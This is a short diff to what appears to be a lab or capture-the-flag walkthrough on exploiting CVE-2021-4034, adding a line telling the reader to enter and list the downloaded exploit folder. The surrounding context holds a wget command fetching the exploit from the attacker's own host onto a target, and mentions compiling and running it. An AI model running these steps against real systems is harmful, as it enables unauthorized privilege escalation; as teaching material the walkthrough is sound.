@@ -498,6 +498,8 @@ Open a new terminal window and ```git clone``` the code from that link like I've
 wget -r -nH http://[yourIP]/CVE-2021-4034
 ```
 
+You should be left with a folder name *CVE-2021-4034*. ```cd``` into it and ```ls``` to view the files.
+
 <p align="center"> <img src="./images/60.png"></p><br>
 
 <p>Now to test if this works, all we need to do is run a command to compile the scripts inside and run the exploit.</p>
